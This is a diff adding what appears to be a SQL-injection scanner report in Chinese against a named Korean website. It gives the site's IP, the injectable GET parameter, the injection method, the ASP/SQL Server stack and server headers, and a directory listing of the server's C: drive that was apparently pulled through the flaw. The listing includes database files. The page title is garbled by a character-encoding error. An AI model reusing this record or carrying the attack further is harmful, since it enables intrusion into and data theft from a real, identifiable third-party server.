@@ -1,0 +1,43 @@
+■漏洞信息:============================================================
+ ·URL:http://www.hrdclub.co.kr/HRD_BOARD/List.asp?words=&sel=&GotoPage=13&BOARD_NO=10500
+ ·页面标题：拌谅力村哪- www.hrdclub.co.kr -流诀瓷仿俺惯拌谅力-郴老硅框墨靛力-秦寇秒诀-惫厚公丰背腊沥焊力傍-惫厚瘤盔背腊沥焊季磐 www.gukbi.com-绊侩瘤盔季磐-郴老硅框墨靛
+ ·参数:words=&sel=&GotoPage=13&BOARD_NO=10500
+ ·方法:GET
+ ·类型:Numeric
+ ·利用方法:And
+ ·脚本语言:asp
+ ·IP:61.111.18.164
+ ·数据库:SQL Server
+ ·HEAD:
+HTTP/1.1 200 OK
+Cache-Control: private
+Content-Length: 40506
+Content-Type: text/html
+Server: Microsoft-IIS/7.5
+Set-Cookie: ASPSESSIONIDQCQTQSDR=FBCPKBHAFJFHEANKENGGECKJ; path=/
+X-Powered-By: ASP.NET
+Date: Mon, 04 Apr 2011 08:41:26 GMT
+Connection: close
+
+
+Dir of C:: 
+
+ADFS\
+compaq\
+cpqsystem\
+Documents and Settings\
+hp\
+managementgatewayupdate\
+Program Files\
+RECYCLER\
+script\
+System Volume Information\
+WINDOWS\
+wmpub\
+AUTOEXEC.BAT
+CONFIG.SYS
+imin.sql
+JEJUWOORIDLE_Data.MDF
+JEJUWOORIDLE_log.LDF
+msizap.exe
+
